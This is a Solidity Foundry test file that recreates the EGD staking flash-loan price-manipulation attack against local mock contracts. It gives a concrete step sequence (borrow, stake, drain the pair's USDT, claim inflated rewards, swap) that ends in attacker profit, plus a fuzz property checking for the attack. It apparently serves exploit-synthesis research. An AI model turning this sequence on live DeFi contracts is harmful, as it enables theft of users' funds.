// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./EGD.sol";
import "./EGDStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract EGDTestBase is Test, BlockLoader {
    EGD egd;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    EGDStaking egdstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address egdAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address egdstakingAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1659914092;
    uint112 reserve0pair = 52443151506653906536540000;
    uint112 reserve1pair = 424456224403899287665961;
    uint32 blockTimestampLastpair = 1659914092;
    uint256 kLastpair = 22259713976354534524259402206876732922981387200000;
    uint256 price0CumulativeLastpair =
        17926177941217205516333779465403739154183922;
    uint256 price1CumulativeLastpair =
        4165161045287207174726887479302333129143660;
    uint256 totalSupplyegd = 118000000000000000000000000;
    uint256 balanceOfegdpair = 52443151506653906536540000;
    uint256 balanceOfegdattacker = 0;
    uint256 balanceOfegdegdstaking = 5670246682724687331970000;
    uint256 totalSupplyusdt = 4979997922172658408539526080;
    uint256 balanceOfusdtpair = 424456224403899287665961;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtegdstaking = 3;

    function setUp() public {
        owner = address(this);
        egd = new EGD();
        egdAddr = address(egd);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(egd),
            address(usdt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        egdstaking = new EGDStaking(
            address(egd),
            address(usdt),
            address(router),
            address(pair)
        );
        egdstakingAddr = address(egdstaking);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        egd.afterDeploy(owner, attacker, address(pair), address(egdstaking));
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        egd.transfer(address(pair), balanceOfegdpair);
        usdt.transfer(address(egdstaking), balanceOfusdtegdstaking);
        egd.transfer(address(egdstaking), balanceOfegdegdstaking);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Egd Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(egd), usdt.decimals());
        queryERC20BalanceDecimals(address(egd), address(egd), egd.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(usdt), egd.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(egd), address(pair), egd.decimals());
        emit log_string("");
        emit log_string("Egdstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(egdstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(egdstaking),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(egd),
            address(attacker),
            egd.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_egd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        egd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_egd_owner(uint256 amount) internal eurus {
        egd.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_egd_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        egd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_egd_pair(uint256 amount) internal eurus {
        egd.transfer(address(pair), amount);
    }

    function swap_pair_attacker_egd_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        egd.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_usdt_egd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_egdstaking_usdt_egdslp(uint256 amount) internal eurus {
        usdt.approve(address(egdstaking), amount);
        egdstaking.stake(amount);
        vm.warp(block.timestamp + 54);
    }

    function withdraw_egdstaking_egdslp_egd(uint256 amount) internal eurus {
        egdstaking.claimAllReward();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(2100e18);
        printBalance("After step0 ");
        deposit_egdstaking_usdt_egdslp(100e18);
        printBalance("After step1 ");
        borrow_usdt_pair(424526221219952604636716);
        printBalance("After step2 ");
        withdraw_egdstaking_egdslp_egd(0);
        printBalance("After step3 ");
        payback_usdt_pair((uint(424526221219952604636716) * 1003) / 1000);
        printBalance("After step4 ");
        swap_pair_attacker_egd_usdt(
            egd.balanceOf(attacker),
            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
        );
        printBalance("After step5 ");
        payback_usdt_owner((2100e18 * 1003) / 1000);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_usdt_owner(amt0);
        deposit_egdstaking_usdt_egdslp(amt1);
        borrow_usdt_pair(amt2);
        withdraw_egdstaking_egdslp_egd(amt3);
        payback_usdt_pair(amt4);
        swap_pair_attacker_egd_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
